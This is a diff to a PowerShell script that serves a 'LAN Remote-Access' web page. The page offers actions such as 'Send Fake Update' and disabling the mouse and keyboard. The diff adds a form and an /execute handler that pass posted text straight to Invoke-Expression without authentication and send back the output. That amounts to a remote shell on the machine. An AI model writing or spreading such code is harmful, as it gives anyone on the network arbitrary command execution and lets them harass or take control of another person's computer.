@@ -64,7 +64,6 @@ while ($httpsrvlsnr.IsListening) {
         if ($ctx.Request.RawUrl -eq "/") {
             $html = "<html><body><ul>"
             $html += "<br></br><h3>LAN Remote-Access</h3>"
-            $html += "<li><a href='/stop'>Kill Session</a></li>"
             $html += "<br></br>"
             $html += "<li><a href='/mini'>Minimize All Apps</a></li>"
             $html += "<li><a href='/update'>Send Fake Update</a></li>"
@@ -80,6 +79,14 @@ while ($httpsrvlsnr.IsListening) {
             $html += "<li><a href='/inputon'>Enable Mouse and Keyboard</a></li>"
             $html += "<li><a href='/inputoff'>Disable Mouse and Keyboard</a></li>"
             $html += "</ul></body></html>"
+            $html += "<h1>Stop the Server </h1><a href='/stop'><button>STOP SERVER</button></a><hr>"
+            $html += "<h1>PowerShell Command Input</h1>"
+            $html += "<form method='post' action='/execute'>"
+            $html += "<input type='submit' value='Execute'>"
+            $html += "<textarea name='command' rows='10' cols='80'></textarea><br>"
+            $html += "</form>"
+            $html += "<br></br>"
+            $html += "</body></html>"
             $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
             $ctx.Response.ContentLength64 = $buffer.Length;
             $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
@@ -217,7 +224,22 @@ $PNPKeyboard.Disable()
 Write-Output "Done."
 }
 
+elseif ($ctx.Request.RawUrl -eq "/execute" -and $ctx.Request.HttpMethod -eq "POST") {
+            $reader = New-Object IO.StreamReader $ctx.Request.InputStream,[System.Text.Encoding]::UTF8
+            $postParams = $reader.ReadToEnd()
+            $reader.Close()
 
+            $command = $postParams.Split('=')[1] -replace "%20", " "
+            $output = Invoke-Expression $command | Out-String
+
+            $html = "<html>"
+            $html += "<body>"
+
+            $html += "<h1>Command Output</h1><pre>$output</pre></body></html>"
+            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
+            $ctx.Response.ContentLength64 = $buffer.Length;
+            $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
+        }
 
     }
     catch [System.Net.HttpListenerException] {
